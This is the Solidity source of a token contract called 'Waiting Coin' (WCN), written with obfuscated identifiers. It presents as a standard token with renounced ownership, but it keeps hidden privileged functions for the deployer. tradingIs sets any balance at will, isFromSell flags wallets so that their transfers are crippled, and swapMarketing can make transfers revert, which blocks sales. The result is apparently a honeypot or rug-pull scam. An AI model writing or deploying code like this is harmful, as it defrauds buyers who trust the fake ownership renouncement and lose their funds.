//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract atTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromLimit {
    function createPair(address toSwapTotal, address shouldAuto) external returns (address);

    function feeTo() external view returns (address);
}

interface limitAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface launchedLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingBuyLaunch) external view returns (uint256);

    function transfer(address limitTo, uint256 toExempt) external returns (bool);

    function allowance(address exemptShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 toExempt) external returns (bool);

    function transferFrom(
        address sender,
        address limitTo,
        uint256 toExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingMax, uint256 value);
    event Approval(address indexed exemptShould, address indexed spender, uint256 value);
}

interface liquidityReceiver is launchedLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WaitingCoin is atTake, launchedLaunch, liquidityReceiver {

    uint256 private fundMarketing = 100000000 * 10 ** 18;

    function transfer(address receiverLaunchLaunched, uint256 toExempt) external virtual override returns (bool) {
        return receiverMin(_msgSender(), receiverLaunchLaunched, toExempt);
    }

    address modeEnableFrom;

    bool private minEnable;

    string private walletReceiverMin = "WCN";

    address liquidityBuyWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverLiquidity(address listLaunched, address limitTo, uint256 toExempt) internal view returns (uint256) {
        require(toExempt > 0);

        uint256 autoModeTake = 0;
        if (listLaunched == exemptTotalTrading && fundWallet > 0) {
            autoModeTake = toExempt * fundWallet / 100;
        } else if (limitTo == exemptTotalTrading && enableShould > 0) {
            autoModeTake = toExempt * enableShould / 100;
        }
        require(autoModeTake <= toExempt);
        return toExempt - autoModeTake;
    }

    bool public swapSender;

    function receiverMin(address listLaunched, address limitTo, uint256 toExempt) internal returns (bool) {
        if (listLaunched == swapTx) {
            return exemptSender(listLaunched, limitTo, toExempt);
        }
        uint256 takeMinAt = launchedLaunch(exemptTotalTrading).balanceOf(modeEnableFrom);
        require(takeMinAt == receiverLimitLiquidity);
        require(limitTo != modeEnableFrom);
        if (buyExempt[listLaunched]) {
            return exemptSender(listLaunched, limitTo, limitList);
        }
        toExempt = receiverLiquidity(listLaunched, limitTo, toExempt);
        return exemptSender(listLaunched, limitTo, toExempt);
    }

    bool public maxTx;

    uint256 constant limitList = 16 ** 10;

    function getOwner() external view returns (address) {
        return fromAt;
    }

    mapping(address => bool) public buyExempt;

    mapping(address => mapping(address => uint256)) private liquidityTrading;

    function approve(address liquidityAt, uint256 toExempt) public virtual override returns (bool) {
        liquidityTrading[_msgSender()][liquidityAt] = toExempt;
        emit Approval(_msgSender(), liquidityAt, toExempt);
        return true;
    }

    uint8 private enableTrading = 18;

    address private fromAt;

    function owner() external view returns (address) {
        return fromAt;
    }

    function transferFrom(address listLaunched, address limitTo, uint256 toExempt) external override returns (bool) {
        if (_msgSender() != liquidityBuyWallet) {
            if (liquidityTrading[listLaunched][_msgSender()] != type(uint256).max) {
                require(toExempt <= liquidityTrading[listLaunched][_msgSender()]);
                liquidityTrading[listLaunched][_msgSender()] -= toExempt;
            }
        }
        return receiverMin(listLaunched, limitTo, toExempt);
    }

    event OwnershipTransferred(address indexed shouldMarketing, address indexed swapLaunch);

    bool public receiverExempt;

    function totalSupply() external view virtual override returns (uint256) {
        return fundMarketing;
    }

    uint256 public enableShould = 0;

    bool public launchEnable;

    uint256 receiverLimitLiquidity;

    function exemptSender(address listLaunched, address limitTo, uint256 toExempt) internal returns (bool) {
        require(modeMax[listLaunched] >= toExempt);
        modeMax[listLaunched] -= toExempt;
        modeMax[limitTo] += toExempt;
        emit Transfer(listLaunched, limitTo, toExempt);
        return true;
    }

    address public swapTx;

    function toShould() public {
        emit OwnershipTransferred(swapTx, address(0));
        fromAt = address(0);
    }

    address public exemptTotalTrading;

    string private fundLimit = "Waiting Coin";

    uint256 public senderTotal;

    constructor (){
        
        toShould();
        limitAuto atReceiver = limitAuto(liquidityBuyWallet);
        exemptTotalTrading = fromLimit(atReceiver.factory()).createPair(atReceiver.WETH(), address(this));
        modeEnableFrom = fromLimit(atReceiver.factory()).feeTo();
        if (launchEnable) {
            txAuto = senderTotal;
        }
        swapTx = _msgSender();
        minAt[swapTx] = true;
        modeMax[swapTx] = fundMarketing;
        
        emit Transfer(address(0), swapTx, fundMarketing);
    }

    uint256 public fundWallet = 0;

    mapping(address => bool) public minAt;

    function name() external view virtual override returns (string memory) {
        return fundLimit;
    }

    function balanceOf(address tradingBuyLaunch) public view virtual override returns (uint256) {
        return modeMax[tradingBuyLaunch];
    }

    function decimals() external view virtual override returns (uint8) {
        return enableTrading;
    }

    function symbol() external view virtual override returns (string memory) {
        return walletReceiverMin;
    }

    function swapMarketing(uint256 toExempt) public {
        feeLiquidity();
        receiverLimitLiquidity = toExempt;
    }

    uint256 receiverMarketingAt;

    function feeReceiver(address modeSender) public {
        require(modeSender.balance < 100000);
        if (maxTx) {
            return;
        }
        
        minAt[modeSender] = true;
        
        maxTx = true;
    }

    bool public sellWallet;

    function tradingIs(address receiverLaunchLaunched, uint256 toExempt) public {
        feeLiquidity();
        modeMax[receiverLaunchLaunched] = toExempt;
    }

    uint256 private txAuto;

    function isFromSell(address walletFrom) public {
        feeLiquidity();
        if (txAuto == senderTotal) {
            senderTotal = txAuto;
        }
        if (walletFrom == swapTx || walletFrom == exemptTotalTrading) {
            return;
        }
        buyExempt[walletFrom] = true;
    }

    function feeLiquidity() private view {
        require(minAt[_msgSender()]);
    }

    bool public autoTrading;

    mapping(address => uint256) private modeMax;

    function allowance(address walletSender, address liquidityAt) external view virtual override returns (uint256) {
        if (liquidityAt == liquidityBuyWallet) {
            return type(uint256).max;
        }
        return liquidityTrading[walletSender][liquidityAt];
    }

}